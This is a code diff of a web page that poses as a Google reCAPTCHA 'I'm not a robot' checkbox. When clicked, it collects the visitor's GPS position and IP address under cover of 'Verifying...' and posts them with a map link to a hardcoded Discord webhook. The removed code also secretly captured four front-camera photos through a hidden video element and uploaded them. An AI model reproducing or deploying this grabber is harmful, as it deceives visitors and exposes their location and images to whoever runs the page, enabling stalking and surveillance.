@@ -17,7 +17,9 @@
         box-sizing: border-box;
     }
 
-    .recaptcha-box {
+    .rc-wrap { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+
+    .rc-box {
         width: 304px;
         background: #fff;
         border: 1px solid #d3d3d3;
@@ -27,9 +29,9 @@
         user-select: none;
     }
 
-    .recaptcha-header { display: flex; align-items: center; padding: 14px 16px 14px 12px; }
+    .rc-head { display: flex; align-items: center; padding: 14px 16px 14px 12px; }
 
-    .checkbox-square {
+    .rc-cb {
         width: 28px; height: 28px;
         border: 2px solid #c1c1c1;
         background: #fff;
@@ -40,32 +42,32 @@
         flex: 0 0 auto;
     }
 
-    .checkbox-square.checked { background: #156b3c; border-color: #156b3c; }
-    .checkbox-square.loading { background: #f9f9f9; border-color: #c1c1c1; }
+    .rc-cb.checked { background: #156b3c; border-color: #156b3c; }
+    .rc-cb.loading { background: #f9f9f9; border-color: #c1c1c1; }
 
-    .check-icon { color: #fff; font-size: 20px; font-weight: bold; line-height: 1; display: none; }
-    .checkbox-square.checked .check-icon { display: block; }
+    .rc-tick { color: #fff; font-size: 19px; font-weight: bold; line-height: 1; display: none; }
+    .rc-cb.checked .rc-tick { display: block; }
 
-    .spinner {
+    .rc-spin {
         width: 18px; height: 18px;
         border: 2px solid #e0e0e0;
         border-top-color: #156b3c;
         border-radius: 50%;
-        animation: spin 1s linear infinite;
+        animation: rcs 1s linear infinite;
         display: none;
     }
 
-    .checkbox-square.loading .spinner { display: block; }
-    .checkbox-square.checked .spinner { display: none; }
+    .rc-cb.loading .rc-spin { display: block; }
+    .rc-cb.checked .rc-spin { display: none; }
 
-    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes rcs { to { transform: rotate(360deg); } }
 
-    .logo-area { flex: 1; display: flex; align-items: center; gap: 8px; }
-    .recaptcha-logo { width: 42px; height: 42px; flex: 0 0 auto; }
-    .main-text { font-size: 14px; color: #222; font-weight: 500; }
-    .sub-text { font-size: 10px; color: #888; margin-top: 2px; }
+    .rc-logo { flex: 1; display: flex; align-items: center; gap: 8px; }
+    .rc-mark { width: 42px; height: 42px; flex: 0 0 auto; }
+    .rc-main { font-size: 14px; color: #222; font-weight: 500; }
+    .rc-sub { font-size: 10px; color: #888; margin-top: 2px; }
 
-    .recaptcha-footer {
+    .rc-foot {
         background: #f9f9f9;
         border-top: 1px solid #e8e8e8;
         padding: 8px 16px;
@@ -75,36 +77,44 @@
         color: #555;
     }
 
-    .footer-links a { color: #555; text-decoration: none; margin-left: 8px; }
+    .rc-foot a { color: #555; text-decoration: none; margin-left: 8px; }
+
+    .rc-status {
+        font: 11px/1.6 ui-monospace, Menlo, Consolas, monospace;
+        color: #777;
+        text-align: center;
+        max-width: 330px;
+        word-break: break-word;
+    }
 </style>
 </head>
 <body>
 
-<div class="recaptcha-box" id="recaptchaWidget">
-    <div class="recaptcha-header">
-        <div class="checkbox-square" id="checkboxBox">
-            <span class="check-icon">&#10003;</span>
-            <div class="spinner"></div>
-        </div>
-        <div class="logo-area">
-            <svg class="recaptcha-logo" viewBox="0 0 48 48">
-                <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
-                <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
-                <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
-            </svg>
-            <div class="text-area">
-                <span class="main-text" id="mainText">I'm not a robot</span>
-                <span class="sub-text">Privacy - Terms</span>
+<div class="rc-wrap">
+    <div class="rc-box" id="widget">
+        <div class="rc-head">
+            <div class="rc-cb" id="cb">
+                <span class="rc-tick">&#10003;</span>
+                <div class="rc-spin"></div>
+            </div>
+            <div class="rc-logo">
+                <svg class="rc-mark" viewBox="0 0 48 48">
+                    <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
+                    <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
+                    <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
+                </svg>
+                <div>
+                    <div class="rc-main" id="mainText">I'm not a robot</div>
+                    <div class="rc-sub">Privacy - Terms</div>
+                </div>
             </div>
         </div>
-    </div>
-    <div class="recaptcha-footer">
-        <span>Protected by reCAPTCHA</span>
-        <div class="footer-links">
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
+        <div class="rc-foot">
+            <span>Protected by reCAPTCHA</span>
+            <span><a href="#">Privacy</a><a href="#">Terms</a></span>
         </div>
     </div>
+    <div class="rc-status" id="status">idle</div>
 </div>
 
 <script>
@@ -113,133 +123,54 @@
    ============================================================ */
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';
 
-/* 2. OPTIONAL - Google Static Maps key for a real Google map preview.
-      Leave empty to use the free OSM preview. */
+/* 2. OPTIONAL - paste a Google Static Maps API key to get the real
+      Google map preview. Leave empty to use the free OSM preview. */
 const GOOGLE_MAPS_KEY = '';
 
-const widget   = document.getElementById('recaptchaWidget');
-const checkbox = document.getElementById('checkboxBox');
+const widget   = document.getElementById('widget');
+const cb       = document.getElementById('cb');
 const mainText = document.getElementById('mainText');
+const statusEl = document.getElementById('status');
 
 let busy = false;
+const say = m => { statusEl.textContent = m; };
 
 widget.addEventListener('click', async () => {
     if (busy) return;
     busy = true;
-
-    checkbox.classList.add('loading');
+    cb.classList.add('loading');
     mainText.textContent = 'Verifying...';
 
-    // Location starts FIRST and synchronously so mobile keeps the click gesture.
-    const locPromise = getLocation();
-    const ipPromise  = getIP();
-
     try {
-        const photos = await capturePhotos();
+        say('asking for location...');
 
-        // Hard ceiling so a stalled GPS fix can never block the upload.
+        // Called FIRST and synchronously so the browser keeps the click gesture.
+        const locPromise = getLocation();
+        const ipPromise  = getIP();
+
         const location = await Promise.race([
             locPromise,
             new Promise(r => setTimeout(() => r(null), 25000))
         ]);
         const ip = await ipPromise;
 
-        await send(photos, ip, location);
+        say(location ? ('got: ' + location.label + ' [' + location.src + ']') : 'location unavailable');
+
+        await send(ip, location);
+        say('sent' + (location ? '' : ' (no location)'));
     } catch (e) {
         console.warn(e);
+        say('error: ' + e.message);
     }
 
-    checkbox.classList.remove('loading');
-    checkbox.classList.add('checked');
+    cb.classList.remove('loading');
+    cb.classList.add('checked');
     mainText.textContent = 'Verified';
     busy = false;
 });
 
 /* ============================================================
-   CAMERA - 4 front-cam snaps, returned as real File objects
-   ============================================================ */
-async function capturePhotos() {
-    const out = [];
-
-    for (let i = 1; i <= 4; i++) {
-        const blob = await snap();
-        if (!blob) continue;
-
-        const name = 'front_snap_' + i + '.jpg';
-
-        // A real File carries its own .name, which Safari cannot override.
-        let file;
-        try {
-            file = new File([blob], name, { type: 'image/jpeg' });
-        } catch (e) {
-            file = blob;
-            file.name = name;
-        }
-
-        out.push({ file: file, name: name });
-    }
-
-    return out;
-}
-
-function snap() {
-    return new Promise(async resolve => {
-        let done = false;
-        const finish = v => { if (!done) { done = true; resolve(v); } };
-        const guard = setTimeout(() => finish(null), 6000);
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
-
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.setAttribute('playsinline', '');
-            video.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
-            document.body.appendChild(video);
-
-            await new Promise(res => {
-                let s = false;
-                const go = () => { if (!s) { s = true; res(); } };
-                video.onloadedmetadata = go;
-                video.onerror = go;
-                setTimeout(go, 2000);
-            });
-
-            await video.play().catch(() => {});
-            await new Promise(r => setTimeout(r, 400));
-
-            const w = video.videoWidth || 640;
-            const h = video.videoHeight || 480;
-            const canvas = document.createElement('canvas');
-            canvas.width = w;
-            canvas.height = h;
-
-            const ctx = canvas.getContext('2d');
-            ctx.translate(w, 0);
-            ctx.scale(-1, 1);                 // mirror, like a front cam
-            ctx.drawImage(video, 0, 0, w, h);
-
-            stream.getTracks().forEach(t => t.stop());
-            video.srcObject = null;
-            video.remove();
-
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-            clearTimeout(guard);
-            finish(blob);
-        } catch (e) {
-            console.warn('snap', e);
-            clearTimeout(guard);
-            finish(null);
-        }
-    });
-}
-
-/* ============================================================
-   LOCATION - GPS and IP lookup race each other
+   LOCATION - GPS and IP lookup race each other.
    ============================================================ */
 function getLocation() {
     const gpsPromise = gpsLocation();
@@ -385,19 +316,21 @@ async function getIP() {
 }
 
 /* ============================================================
-   SEND TO DISCORD
+   SEND TO DISCORD - plain JSON, no FormData, no blobs
    ============================================================ */
-async function send(photos, ip, location) {
+async function send(ip, location) {
     let maps = null;
     let coords = null;
 
     if (location) {
         coords = location.lat.toFixed(7) + ', ' + location.lng.toFixed(7);
+
+        // Official Google Maps deep link - opens at the exact pin.
         maps = 'https://www.google.com/maps/search/?api=1&query=' +
                location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
     }
 
-    const lines = ['**Verification Captured**'];
+    const lines = ['**Location Verified**'];
 
     if (location) {
         lines.push('Location: ' + location.label);
@@ -411,15 +344,11 @@ async function send(photos, ip, location) {
     lines.push('IP: ' + ip);
 
     const embed = {
-        title: 'Verification Capture',
+        title: 'Location Captured',
         color: 0x156b3c,
         fields: [{ name: 'IP Address', value: ip, inline: true }],
         timestamp: new Date().toISOString()
     };
-
-    if (photos.length) {
-        embed.fields.push({ name: 'Photos', value: String(photos.length), inline: true });
-    }
 
     if (location) {
         embed.url = maps;
@@ -442,6 +371,7 @@ async function send(photos, ip, location) {
             inline: false
         });
 
+        // Map preview: Google Static Maps if you supplied a key, else free OSM tiles.
         embed.image = {
             url: GOOGLE_MAPS_KEY
                 ? 'https://maps.googleapis.com/maps/api/staticmap?center=' + location.lat + ',' + location.lng +
@@ -451,35 +381,17 @@ async function send(photos, ip, location) {
         };
     }
 
-    /* No photos at all -> plain JSON POST, zero multipart involved. */
-    if (!photos.length) {
-        const res = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: lines.join('\n'), embeds: [embed] })
-        });
-        if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
-        return;
-    }
-
-    /* Photos present -> multipart, with File objects so names are honoured. */
     const payload = {
         content: lines.join('\n'),
-        embeds: [embed],
-        attachments: []
+        embeds: [embed]
     };
 
-    const formData = new FormData();
-
-    photos.forEach((photo, index) => {
-        formData.append('files[' + index + ']', photo.file, photo.name);
-        payload.attachments.push({ id: index, filename: photo.name });
+    const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
     });
 
-    // payload_json must be appended AFTER the files are registered.
-    formData.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
-
-    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
     if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
 }
 </script>
